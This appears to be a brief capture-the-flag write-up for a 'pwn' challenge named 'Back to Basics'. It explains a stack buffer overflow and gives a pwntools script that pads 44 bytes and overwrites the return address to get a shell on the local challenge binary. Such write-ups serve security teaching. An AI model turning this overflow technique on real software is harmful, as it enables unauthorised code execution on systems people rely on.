---
title: Back to Basics
category: pwn
ctf: CUTS CTF 2026
points: 50
author: Pwnzer
---

# Back to Basics

A simple buffer overflow.

We have a buffer size of 32, we need to inject 44 bytes to overwrite RIP.

## Exploitation

\`\`\`python
from pwn import *

p = process('./back_to_basics')
payload = b'A' * 44 + p64(0x401234)
p.sendline(payload)
p.interactive()
\`\`\`

## Result

Once run, we get the shell.
![[screenshot1.png]]
